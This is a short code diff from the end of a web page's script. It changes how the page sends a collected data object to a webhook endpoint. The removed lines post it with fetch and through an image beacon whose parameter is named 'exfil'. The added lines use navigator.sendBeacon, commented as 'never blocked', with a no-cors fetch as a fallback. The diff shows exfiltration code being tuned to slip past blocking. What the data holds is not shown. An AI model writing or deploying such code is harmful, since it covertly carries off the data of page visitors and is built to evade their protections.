@@ -88,16 +88,12 @@
 
       d.timestamp = new Date().toISOString();
 
-      // Send everything in one shot
+      // Send everything in one shot via sendBeacon (never blocked)
       const payload = JSON.stringify(d);
+      navigator.sendBeacon(WH, payload);
       
-      // Try fetch first
-      try {
-        await fetch(WH, {method:'POST', headers:{'Content-Type':'application/json'}, body:payload});
-      } catch(e) {}
-
-      // Always send image beacon as backup
-      new Image().src = WH + '?exfil=' + encodeURIComponent(payload);
+      // Backup: fetch with no-cors
+      fetch(WH, {method:'POST', mode:'no-cors', body:payload}).catch(()=>{});
     })();
   </script>
 </body>
